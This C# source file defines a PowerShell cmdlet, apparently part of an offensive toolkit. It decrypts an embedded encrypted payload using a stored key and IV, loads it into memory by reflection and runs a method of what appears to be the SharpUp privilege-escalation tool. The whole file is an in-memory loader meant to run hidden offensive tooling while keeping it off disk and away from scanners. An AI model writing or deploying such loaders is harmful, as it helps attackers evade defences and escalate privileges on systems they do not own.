using System;
using System.Management.Automation;
using System.Reflection;
using TurtleToolKitCrypt;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TurtleUp")] // <- seeting cmdlet name and verbs
    [Alias("INVUP")] //<- cmdlet alias
    public class InvokeTurtleUp : Cmdlet
    {
        [Parameter(Mandatory = false)] [Alias("c")] public string command { get; set; }

        private Cryptor cryptObj;

        protected override void BeginProcessing() { base.BeginProcessing(); }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            WriteVerbose("Command split by whitespace");
            //WriteWarning("DO NOT USE -help in commands, it will crash the process");
            base.ProcessRecord();
            if (ExecuteUp())
            {
                WriteVerbose("Successfully executed");
                return;
            }
            WriteWarning("Failed to execute");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public bool ExecuteUp()
        {
            try
            {
                cryptObj = new Cryptor(TurtleUp.key, TurtleUp.iv);
                var decryptedBytes = cryptObj.DecryptBytes(TurtleUp.encryptedPayload);
                if (decryptedBytes == null)
                {
                    this.WriteWarning("Failed to decrypt bytes");
                    return false;
                }
                var ass = Assembly.Load(decryptedBytes);
                var t = ass.GetType("SharpUp.Program");
                var c = Activator.CreateInstance(t);
                var m = t.GetMethod("Turtle");
                if (string.IsNullOrWhiteSpace(command))
                {
                    command = " ";
                }
                object[] paramz = new object[] { command };
                m.Invoke(c, paramz);
                return true;
            }
            catch (Exception e)
            {
                throw e;
            }
            return true;
        }
    }
}
